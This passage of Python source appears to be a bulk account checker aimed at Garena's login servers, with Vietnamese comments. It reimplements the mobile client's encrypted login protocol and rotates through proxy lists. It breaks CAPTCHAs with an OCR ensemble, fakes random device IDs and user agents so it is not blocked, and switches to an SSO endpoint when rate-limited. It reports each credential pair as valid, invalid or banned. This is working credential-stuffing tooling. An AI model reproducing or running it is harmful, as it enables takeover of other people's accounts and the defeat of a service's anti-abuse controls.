import socket
import struct
import hashlib
import requests
import os
import time
import sys
import random
import re
import unicodedata
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

try:
    import cv2
    import numpy as _np
except ImportError:
    cv2 = None
    _np = None

try:
    from PIL import Image, ImageFilter
except ImportError:
    Image = None
    ImageFilter = None

try:
    import ddddocr
except ImportError:
    ddddocr = None


class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    # Foreground
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    GRAY   = "\033[90m"
    # Background
    BG_GREEN  = "\033[42m"
    BG_RED    = "\033[41m"
    BG_YELLOW = "\033[43m"
    BG_BLUE   = "\033[44m"
    BG_CYAN   = "\033[46m"


def _enable_ansi():
    """Enable ANSI codes on Windows console."""
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_ansi()


def _c(color: str, text: str) -> str:
    """Wrap text in ANSI color (noop if not a tty)."""
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _is_yes(value) -> bool:
    """Normalize common YES/TRUE flags from mixed API payload types."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {
            "YES", "Y", "TRUE", "1", "ON", "BAN", "BANNED"
        }
    return False


def _is_banned_info(ban_info) -> bool:
    """
    Detect active banned state from `banInfo` payload.
    Avoid treating every non-empty object as banned.
    """
    if ban_info is None:
        return False
    if _is_yes(ban_info):
        return True
    if isinstance(ban_info, str):
        s = ban_info.strip().lower()
        if not s:
            return False
        if s in {"no", "none", "null", "false", "0", "ok", "unbanned", "not_banned", "not banned"}:
            return False
        return "ban" in s and "unban" not in s
    if isinstance(ban_info, dict):
        if not ban_info:
            return False
        for key in ("isBan", "isBanned", "banned", "ban", "active"):
            if key in ban_info and _is_yes(ban_info.get(key)):
                return True
        for key in ("status", "state", "banStatus"):
            v = ban_info.get(key)
            if isinstance(v, str) and v.strip().lower() in {
                "banned", "ban", "active_ban", "is_banned", "locked"
            }:
                return True

        def _norm_ts(v):
            """Normalize seconds/milliseconds unix timestamp to seconds."""
            try:
                t = int(float(v or 0))
            except Exception:
                return 0
            if t <= 0:
                return 0
            # 13 digits -> milliseconds
            if t > 10_000_000_000:
                t //= 1000
            return t

        now_ts = int(time.time())

        # Common "ban until" keys from multiple APIs.
        for key in ("endTime", "banEndTime", "expireAt", "expiredAt", "unbanTime"):
            until = _norm_ts(ban_info.get(key))
            if until > now_ts:
                return True

        # banTime + unbanTime window (kientuong returns this shape).
        ban_at = _norm_ts(ban_info.get("banTime"))
        unban_at = _norm_ts(ban_info.get("unbanTime"))
        if ban_at and unban_at and ban_at <= now_ts < unban_at:
            return True
        if ban_at and not unban_at and ban_at <= now_ts:
            return True

        return False
    if isinstance(ban_info, (list, tuple, set)):
        return any(_is_banned_info(item) for item in ban_info)
    return False


def _print_banner():
    banner = f"""
"""
    print(banner)


try:
    import requests as _requests
    _requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Server ──────────────────────────────────────────────────────────────────
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000
_HOST_IP = None  # resolved lazily on first connect
_HOST_IP_lock = __import__('threading').Lock()

def _resolve_host_ip(timeout: int = 5) -> str:
    """Resolve HOST to a connectable IP. Probe DNS + known pool, then cache."""
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    with _HOST_IP_lock:
        if _HOST_IP:
            return _HOST_IP

        candidate_ips = []
        try:
            infos = socket.getaddrinfo(HOST, PORT, socket.AF_INET, socket.SOCK_STREAM)
            for info in infos:
                ip = info[4][0]
                if ip not in candidate_ips:
                    candidate_ips.append(ip)
        except Exception:
            pass

        known_pool = [f"103.247.205.{i}" for i in range(14, 25)]
        for ip in known_pool:
            if ip not in candidate_ips:
                candidate_ips.append(ip)

        for ip in candidate_ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue

        try:
            _HOST_IP = socket.gethostbyname(HOST)
        except Exception:
            _HOST_IP = HOST
        return _HOST_IP

def _make_fast_socket(timeout: int = 20):
    """Create a socket optimized for speed and fast close on Windows."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)
    return sock

# ── Shared HTTP thread pool (parallel per-account HTTP fetches) ─────────────
_HTTP_POOL      = None
_HTTP_POOL_LOCK = __import__('threading').Lock()

def _ensure_http_pool():
    global _HTTP_POOL
    if _HTTP_POOL is not None:
        return _HTTP_POOL
    with _HTTP_POOL_LOCK:
        if _HTTP_POOL is None:
            _HTTP_POOL = ThreadPoolExecutor(max_workers=500, thread_name_prefix='fc_http')
    return _HTTP_POOL


def _retry_wrap(fn, *args, max_retries=2, **kwargs):
    """Retry fn silently, return first non-empty result."""
    last = {}
    for _ in range(max_retries + 1):
        try:
            r = fn(*args, **kwargs)
            if r:
                return r
            last = r
        except Exception:
            pass
    return last


# ── Proxy ───────────────────────────────────────────────────────────────────
_proxy_list = []   # list of (ip, port, user, password) or (ip, port, None, None)
_proxy_idx  = 0
_proxy_lock = __import__('threading').Lock()
_save_lock  = __import__('threading').Lock()
_print_lock = __import__('threading').Lock()
_QUIET_BULK = False

# Cache: (ip, port) -> 'socks5' | 'http'  (detected on first use)
_proxy_type_cache: dict = {}
_proxy_type_lock  = __import__('threading').Lock()

# ── Connection Semaphore ────────────────────────────────────────────────────
# Gioi han so socket TCP mo dong thoi, tranh Windows het ephemeral port (WinError 10048).
# Neu chay nhieu threads, day la cai fix thuc su ── threads co the cao tuy muon
# nhung chi toi da _MAX_CONN socket duoc ket noi cung luc.
_MAX_CONN  = 100                            # chinh soban nay neu can
_conn_sem  = __import__('threading').Semaphore(_MAX_CONN)

def load_proxies(filepath: str):
    """Load proxies from file. Formats: ip:port:user:pass  or  ip:port"""
    global _proxy_list
    proxies = []
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split(':')
            if len(parts) >= 4:
                proxies.append((parts[0], int(parts[1]), parts[2], parts[3]))
            elif len(parts) >= 2:
                proxies.append((parts[0], int(parts[1]), None, None))
    _proxy_list = proxies

def _test_proxy(proxy, timeout: int = 6) -> str:
    """Quick test a proxy. Returns 'socks5', 'http', or raises exception."""
    ip, port, user, pw = proxy
    # Test SOCKS5
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b'\x05\x01\x00')
        resp = s.recv(2)
        s.close()
        if len(resp) == 2 and resp[0] == 5 and resp[1] in (0, 2):
            return 'socks5'
    except Exception:
        pass
    # Test HTTP CONNECT
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b'CONNECT 1.1.1.1:80 HTTP/1.1\r\nHost: 1.1.1.1:80\r\n\r\n')
        resp = s.recv(32)
        s.close()
        if b'HTTP' in resp or b'200' in resp or b'407' in resp:
            return 'http'
    except Exception:
        pass
    raise ConnectionError(f"Proxy {ip}:{port} không phản hồi (dead/cần auth)")

def validate_proxies(print_fn=print) -> int:
    """Test all loaded proxies, remove dead ones. Returns number of live proxies."""
    global _proxy_list
    if not _proxy_list:
        return 0
    live = []
    dead = 0
    for proxy in _proxy_list:
        ip, port = proxy[0], proxy[1]
        try:
            ptype = _test_proxy(proxy, timeout=5)
            with _proxy_type_lock:
                _proxy_type_cache[(ip, port)] = ptype
            live.append(proxy)
        except Exception:
            dead += 1
    _proxy_list = live
    if dead:
        print_fn(_c(C.RED, f"  [!] {dead} proxy chết/không phản hồi đã bị loại bỏ."))
    if not live:
        print_fn(_c(C.RED, "  [!!] Không có proxy nào hoạt động! Checker sẽ dùng kết nối trực tiếp."))
    else:
        print_fn(_c(C.GREEN, f"  [✓] {len(live)} proxy hoạt động."))
    return len(live)

def _next_proxy():
    """Round-robin proxy selection (thread-safe)."""
    global _proxy_idx
    if not _proxy_list:
        return None
    with _proxy_lock:
        p = _proxy_list[_proxy_idx % len(_proxy_list)]
        _proxy_idx += 1
    return p

def _get_http_proxies(proxy):
    """Build requests proxies dict from proxy tuple.
    Uses socks5:// if the proxy was detected as SOCKS5 (or not yet probed),
    else http://.
    """
    if not proxy:
        return None
    ip, port, user, pw = proxy
    # Check cache; assume socks5 by default (high-port proxies are typically SOCKS5)
    ptype = _proxy_type_cache.get((ip, port), 'socks5')
    if ptype == 'socks5':
        if user and pw:
            url = f"socks5://{user}:{pw}@{ip}:{port}"
        else:
            url = f"socks5://{ip}:{port}"
    else:
        if user and pw:
            url = f"http://{user}:{pw}@{ip}:{port}"
        else:
            url = f"http://{ip}:{port}"
    return {"http": url, "https": url}

def _connect_via_socks5(sock, dest_host: str, dest_port: int, user=None, pw=None):
    """Perform SOCKS5 handshake on an already-connected socket. Raises on failure."""
    # Greeting: support NO_AUTH and USER/PASS
    if user and pw:
        sock.sendall(b'\x05\x02\x00\x02')
    else:
        sock.sendall(b'\x05\x01\x00')
    # Server method selection
    resp = b''
    while len(resp) < 2:
        chunk = sock.recv(2)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during greeting")
        resp += chunk
    if resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid version: {resp[0]}")
    method = resp[1]
    if method == 0xFF:
        raise ConnectionError("SOCKS5 no acceptable auth method")
    # Username/password auth (sub-negotiation)
    if method == 2:
        if not (user and pw):
            raise ConnectionError("SOCKS5 proxy requires auth but no credentials provided")
        u = user.encode('utf-8')
        p = pw.encode('utf-8')
        auth_req = bytes([1, len(u)]) + u + bytes([len(p)]) + p
        sock.sendall(auth_req)
        auth_resp = b''
        while len(auth_resp) < 2:
            chunk = sock.recv(2)
            if not chunk:
                raise ConnectionError("SOCKS5 proxy closed during auth")
            auth_resp += chunk
        if auth_resp[1] != 0:
            raise ConnectionError(f"SOCKS5 auth failed: status={auth_resp[1]}")
    elif method != 0:
        raise ConnectionError(f"SOCKS5 unsupported method: {method}")
    # Connect request
    host_enc = dest_host.encode('utf-8')
    req = (b'\x05\x01\x00\x03' +
           bytes([len(host_enc)]) + host_enc +
           struct.pack('>H', dest_port))
    sock.sendall(req)
    # Connect response (at least 10 bytes)
    conn_resp = b''
    while len(conn_resp) < 10:
        chunk = sock.recv(10)
        if not chunk:
            raise ConnectionError("SOCKS5 proxy closed during connect")
        conn_resp += chunk
    if conn_resp[0] != 5:
        raise ConnectionError(f"SOCKS5 invalid response version: {conn_resp[0]}")
    if conn_resp[1] != 0:
        _socks5_errors = {
            1: 'general failure', 2: 'connection not allowed', 3: 'network unreachable',
            4: 'host unreachable', 5: 'connection refused', 6: 'TTL expired',
            7: 'command not supported', 8: 'address type not supported',
        }
        raise ConnectionError(f"SOCKS5 connect error: {_socks5_errors.get(conn_resp[1], conn_resp[1])}")


def _connect_via_proxy(proxy, dest_host: str, dest_port: int, timeout: int = 20):
    """Create a TCP socket tunneled through a proxy.
    Auto-detects SOCKS5 vs HTTP CONNECT by probing SOCKS5 first.
    Falls back to HTTP CONNECT if SOCKS5 handshake fails.
    Caches detected proxy type per (ip, port) to skip re-probing.
    """
    import base64
    ip, port, user, pw = proxy
    key = (ip, port)
    cached_type = _proxy_type_cache.get(key)

    def _try_socks5():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        _connect_via_socks5(s, dest_host, dest_port, user, pw)
        return s

    def _try_http_connect():
        s = _make_fast_socket(timeout)
        s.connect((ip, port))
        connect_line = f"CONNECT {dest_host}:{dest_port} HTTP/1.1\r\nHost: {dest_host}:{dest_port}\r\n"
        if user and pw:
            cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
            connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
        connect_line += "\r\n"
        s.sendall(connect_line.encode())
        resp = b''
        while b'\r\n\r\n' not in resp:
            chunk = s.recv(4096)
            if not chunk:
                raise ConnectionError("Proxy closed connection")
            resp += chunk
        status_line = resp.split(b'\r\n')[0].decode(errors='replace')
        if '200' not in status_line:
            s.close()
            raise ConnectionError(f"Proxy CONNECT failed: {status_line}")
        return s

    # Use cached type if known
    if cached_type == 'socks5':
        return _try_socks5()
    if cached_type == 'http':
        return _try_http_connect()

    # Auto-detect: try SOCKS5 first
    try:
        s = _try_socks5()
        with _proxy_type_lock:
            _proxy_type_cache[key] = 'socks5'
        return s
    except Exception:
        pass
    # Fallback: HTTP CONNECT
    s = _try_http_connect()
    with _proxy_type_lock:
        _proxy_type_cache[key] = 'http'
    return s

# ── Protocol constants ──────────────────────────────────────────────────────
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION          = 283
CLIENT_TYPE             = 4352
CMD_LOGIN_PREPARE       = 256
CMD_LOGIN               = 257
CMD_LOGIN_INFO_GET      = 276
CMD_SESSION_TOKEN_GET   = 278
CMD_USER_BASIC_INFO_LIST_GET = 289
CMD_USER_FULL_INFO_LIST_GET  = 291
CMD_USER_GPP_INFO_LIST_GET   = 337
CMD_USER_ACCOUNT_INFO_GET    = 342
CMD_SSO_KEY_GET         = 442
CMD_APP_OAUTH_LOGIN     = 439
CMD_FB_USER_INFO_GET    = 467
CMD_C2S_REQUEST         = 2
LIEN_QUAN_APP_ID        = 100054
ROV_TH_APP_ID           = 100055
FC_MOBILE_VN_APP_ID     = 100155
DF_GARENA_CLIENT_ID     = 100151
PACKET_VERSION          = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION

CLIENT_ID_MASK = 4354
_pkt_counter   = random.randint(0, 0x3FFFFF)

def _next_id() -> int:
    global _pkt_counter
    _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
    return CLIENT_ID_MASK | _pkt_counter

# ── XTEA-CBC (little-endian blocks, matching Android JNI libcrypt.so) ────────
_XTEA_DELTA  = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v: int) -> int:
    """((v << 4) ^ (v >> 5)) truncated to 32 bits, matching C uint32_t shift."""
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s  = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC encrypt matching libcrypt.so: [E(R)][CBC blocks][check block]
    - First 8 bytes = E_ECB(R) where R is random
    - CBC uses E(R) as the initial chaining value
    - Check block = E_ECB(last_CT ^ (R + sum_of_all_PT_blocks)), 64-bit LE addition
    """
    pad  = 8 - len(data) % 8
    data = data + bytes([pad] * pad)

    # Generate random R, encrypt it as first output block
    R = struct.unpack('<Q', os.urandom(8))[0]
    R_bytes = struct.pack('<Q', R)
    enc_R = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', R_bytes), key))

    # CBC encrypt with E(R) as initial chain value
    prev = enc_R
    out  = bytearray(enc_R)       # first 8 bytes = E(R)
    pt_sum = R                    # accumulate R + all PT blocks
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk  = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1)
        last_ct = prev
        out.extend(prev)

    # Check block = E_ECB(last_CT ^ pt_sum)
    last_ct_val = struct.unpack('<Q', last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack('<Q', check_input)
    check_enc = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', check_bytes), key))
    out.extend(check_enc)
    return bytes(out)

def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    """XTEA-CBC decrypt. Format: [E(R)][CBC blocks][check block]. Strip check, use E(R) as IV."""
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv   = data[:8]             # E(R) — used as CBC chain start
    body = data[8:-8]           # CBC ciphertext (strip check block)
    out  = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk  = body[i:i+8]
        v0, v1 = _xtea_dec_block(*struct.unpack('<2I', blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev))
        out.extend(plain)
        prev = blk
    # Strip PKCS7 padding
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

# ── Minimal protobuf encode/decode ────────────────────────────────────────────
def _varint_enc(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag: int, n: int) -> bytes:
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag: int, b: bytes) -> bytes:
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag: int, s: str) -> bytes:
    return _pf_bytes(tag, s.encode('utf-8'))

def _proto_decode(data: bytes) -> dict:
    fields = {}
    pos = 0
    while pos < len(data):
        try:
            key = 0; shift = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80): break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = val
            elif wt == 2:
                ln = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                fields[fn] = data[pos:pos+ln]
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields

# ── TCP framing ───────────────────────────────────────────────────────────────
def _build_frame(cmd: int, body: bytes) -> bytes:
    """Wire format: [4B LE total] [2B BE header_len] [ClientPacketHeader proto] [body proto]"""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +   # version
        _pf_varint(2, _next_id())       +   # id
        _pf_varint(3, CMD_C2S_REQUEST)  +   # command_type
        _pf_varint(4, cmd)              +   # command
        _pf_varint(6, int(time.time()))     # timestamp
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(payload)) + payload

def _recvall(sock, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection dropped")
        buf += chunk
    return buf

def _recv_frame(sock) -> tuple:
    """Returns (header_fields_dict, body_bytes)"""
    size    = struct.unpack('<I', _recvall(sock, 4))[0]
    payload = _recvall(sock, size)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr     = _proto_decode(payload[2:2+hdr_len])
    body    = payload[2+hdr_len:]
    return hdr, body

def _recv_cmd_frame(sock, target_cmd: int, max_tries: int = 5) -> tuple:
    """Read frames until target command is found (skip spontaneous pushes)."""
    last_hdr, last_body = {5: -1}, b''
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock)
        last_hdr, last_body = hdr, body
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return last_hdr, last_body

# ── Login messages ────────────────────────────────────────────────────────────
def _account_type(account: str) -> int:
    if account.isdigit():
        return 3   # ACCOUNT_MOBILE
    if '@' in account:
        return 2   # ACCOUNT_EMAIL
    try:
        int(account)
        return 0   # ACCOUNT_UID
    except ValueError:
        return 1   # ACCOUNT_USERNAME

def _build_login_prepare(account: str, rand_key: bytes, captcha_key: str = "", captcha: str = "") -> bytes:
    inner = (
        _pf_varint(1, 0)                      +  # auth_type = AUTH_PASSWORD
        _pf_varint(2, _account_type(account)) +  # account_type
        _pf_str(3, account)                   +  # account
        _pf_varint(4, CLIENT_TYPE)            +  # client_type
        _pf_varint(5, CLIENT_VERSION)            # client_version
    )
    if captcha_key:
        inner += _pf_str(7, captcha_key)
    if captcha:
        inner += _pf_str(8, captcha)
        
    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)

def _solve_garena_captcha(proxy_dict=None):
    """Generate key, download image and solve using ensemble (4 methods + majority vote)."""
    if ddddocr is None:
        return "", ""
    
    captcha_key = str(uuid.uuid4()).replace("-", "")
    url = f"http://captcha.garena.com/image?key={captcha_key}"
    if not _QUIET_BULK:
        with _print_lock:
            print(_c(C.YELLOW, f"  [+] CAPTCHA URL: {url}"))
    
    try:
        resp = _requests.get(url, proxies=proxy_dict, timeout=5, verify=False)
        if resp.status_code != 200:
            return "", ""
        
        content = resp.content
        
        if cv2 is not None and _np is not None:
            try:
                from collections import Counter
                nparr = _np.frombuffer(content, _np.uint8)
                img_color = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
                
                # Resize 3x de tang do chinh xac OCR
                img_color = cv2.resize(img_color, (0, 0), fx=3, fy=3,
                                       interpolation=cv2.INTER_CUBIC)
                img_gray = cv2.cvtColor(img_color, cv2.COLOR_BGR2GRAY)
                
                ocr = ddddocr.DdddOcr(show_ad=False, beta=True)
                results = []
                
                # Phuong phap 1: Anh goc mau (khong xu ly)
                _, buf1 = cv2.imencode('.png', img_color)
                r1 = ocr.classification(buf1.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r1.upper()))
                
                # Phuong phap 2: HSV mask mau xanh lam (100-130)
                hsv = cv2.cvtColor(img_color, cv2.COLOR_BGR2HSV)
                mask = cv2.inRange(hsv, _np.array([90, 50, 50]), _np.array([130, 255, 255]))
                final2 = cv2.bitwise_not(mask)
                _, buf2 = cv2.imencode('.png', final2)
                r2 = ocr.classification(buf2.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r2.upper()))
                
                # Phuong phap 3: Adaptive Threshold (tot voi nhieu duong ke)
                blur = cv2.GaussianBlur(img_gray, (3, 3), 0)
                thresh3 = cv2.adaptiveThreshold(blur, 255,
                                                cv2.ADAPTIVE_THRESH_GAUSSIAN_C,
                                                cv2.THRESH_BINARY_INV, 15, 6)
                final3 = cv2.bitwise_not(thresh3)
                _, buf3 = cv2.imencode('.png', final3)
                r3 = ocr.classification(buf3.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r3.upper()))
                
                # Phuong phap 4: Otsu Threshold
                _, thresh4 = cv2.threshold(img_gray, 0, 255,
                                           cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)
                final4 = cv2.bitwise_not(thresh4)
                _, buf4 = cv2.imencode('.png', final4)
                r4 = ocr.classification(buf4.tobytes())
                results.append(re.sub(r'[^A-Z0-9]', '', r4.upper()))
                
                # Lay ket qua xuat hien nhieu nhat (majority vote)
                valid = [r for r in results if len(r) >= 5]
                if valid:
                    res = Counter(valid).most_common(1)[0][0]
                else:
                    res = Counter(results).most_common(1)[0][0]
                
                return captcha_key, res
            except Exception:
                pass
        
        # Fallback: Pillow neu khong co OpenCV
        if Image is not None:
            try:
                img = Image.open(BytesIO(content)).convert('L')
                img = img.filter(ImageFilter.MedianFilter(size=3))
                img = img.point(lambda p: 0 if p < 140 else 255)
                buf = BytesIO()
                img.save(buf, format='PNG')
                content = buf.getvalue()
            except Exception:
                pass
        
        ocr = ddddocr.DdddOcr(show_ad=False)
        res = ocr.classification(content)
        if res:
            res = re.sub(r'[^A-Z0-9]', '', res.upper())
        return captcha_key, res
    except Exception:
        pass
    return "", ""


def _derive_login_key(password: str, salt: str, verify_code: str):
    """Matches login/b/b.java 3-arg constructor exactly.
    strA = MD5hex(password)
    xtea_key = SHA256(hex(SHA256(strA + salt)) + verify_code)[:16]
    pw_hash  = strA.encode('ascii')
    """
    md5hex     = hashlib.md5(password.encode('utf-8')).hexdigest()
    inner_raw  = hashlib.sha256((md5hex + salt).encode('utf-8')).digest()
    inner_hex  = inner_raw.hex()
    xtea_key   = hashlib.sha256((inner_hex + verify_code).encode('utf-8')).digest()[:16]
    pw_hash    = md5hex.encode('ascii')
    return xtea_key, pw_hash

# ── Mã lỗi từ GxxData.Constant.Result (login/d.java, AnonymousClass8) ─────────
# result=1 → ERROR_AUTH       → sai mật khẩu
# result=2 → ERROR_ACCOUNT_NOT_EXIST → không có tài khoản
# result=3 → ERROR_CAPTCHA    → server yêu cầu CAPTCHA (bị rate-limit/block IP)
# result=4 → ERROR_AUTH_USER_BAN → tài khoản bị ban
# result=5 → ERROR_AUTH_SECURITY_BAN → bị ban bảo mật
_PREPARE_RESULT_MAP = {
    1: "INVALID",   # ERROR_AUTH - sai pass
    2: "NOT_FOUND", # ERROR_ACCOUNT_NOT_EXIST
    3: "CAPTCHA",   # ERROR_CAPTCHA - bị rate-limit, dùng HTTP fallback
    4: "BANNED",    # ERROR_AUTH_USER_BAN
    5: "SEC_BANNED",# ERROR_AUTH_SECURITY_BAN
}

def _http_login_garena(account: str, password: str, app_id: int = 100054,
                       proxy=None, timeout: int = 15) -> dict:
    """HTTP API login fallback - dùng khi TCP bị CAPTCHA (result=3).
    URL: https://{app_id}.connect.garena.com/api/login
    password = MD5hex(password)  (xem login/b/b.java)
    Trả về dict với 'uid', 'access_token', 'open_id' nếu thành công,
    hoặc {'error': ..., 'error_code': ...} nếu thất bại.
    """
    if not HAS_REQUESTS:
        return {'error': 'requests not available'}
    md5pw = hashlib.md5(password.encode('utf-8')).hexdigest()
    # Thu endpoint SSO (khong can CAPTCHA nhu TCP)
    url   = f"https://sso.garena.com/api/login"
    ts_ms = int(time.time() * 1000)
    params = {
        'app_id'      : str(app_id),
        'account'     : account,
        'password'    : md5pw,
        'redirect_uri': f'https://account.garena.com/',
        'format'      : 'json',
        'id'          : str(ts_ms),
    }
    # Danh sách thiết bị Android hiện đại để giả lập
    DEVICE_PROFILES = [
        "SM-S918B ;Android 13;vi;vn;", # S23 Ultra
        "SM-G998B ;Android 12;vi;vn;", # S21 Ultra
        "Pixel 7 ;Android 13;vi;vn;",
        "SM-A525F ;Android 12;vi;vn;", # A52
        "RMX3370 ;Android 12;vi;vn;",  # Realme GT Neo 2
        "M2102J20SG ;Android 11;vi;vn;", # POCO X3 Pro
    ]
    ua_profile = random.choice(DEVICE_PROFILES)
    headers = {
        'User-Agent': f'GarenaMSDK/5.12.1({ua_profile})',
        'Accept'    : 'application/json',
    }
    try:
        resp = _requests.get(
            url, params=params, headers=headers,
            timeout=timeout, verify=False,
            proxies=_get_http_proxies(proxy),
            allow_redirects=False,
        )
        # Server trả về redirect 302 với access_token trong Location khi thành công
        if resp.status_code in (301, 302):
            loc = resp.headers.get('Location', '')
            # Trích access_token từ URL redirect
            m = re.search(r'access_token=([^&]+)', loc)
            m_uid = re.search(r'open_id=([^&]+)', loc)
            if m:
                return {
                    'access_token': m.group(1),
                    'open_id'     : m_uid.group(1) if m_uid else '',
                    '_method'     : 'http',
                }
        # Một số version trả JSON trực tiếp
        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'access_token' in data:
                    return {
                        'access_token': data['access_token'],
                        'open_id'     : str(data.get('open_id', '')),
                        '_method'     : 'http',
                    }
                # Lỗi từ server
                return {
                    'error'     : data.get('error_description', data.get('error', 'unknown')),
                    'error_code': data.get('error', ''),
                }
            except Exception:
                pass
        return {'error': f'http_status={resp.status_code}'}
    except Exception as exc:
        return {'error': str(exc)}

def _build_login(account: str, password: str, salt: str, verify_code: str):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    user_status_bytes = _pf_varint(2, 4608)    # UserStatus { status=USER_STATUS_MOBILE_ACTIVE }
    # Fake thiết bị ngẫu nhiên hoàn toàn để tránh block
    device_id = os.urandom(16)
    inner = (
        _pf_bytes(1, pw_hash)                +  # password_hash (MD5hex as ASCII bytes)
        _pf_varint(2, 0)                     +  # login_mode = LOGIN_NORMAL
        _pf_bytes(3, user_status_bytes)      +  # user_status sub-message
        _pf_bytes(4, device_id)                 # device_id
    )
    enc  = xtea_encrypt(inner, xtea_key)
    body = _pf_bytes(1, enc)                    # LoginRequest.data
    return body, xtea_key

# ── Session-encrypted framing (post-login) ────────────────────────────────────
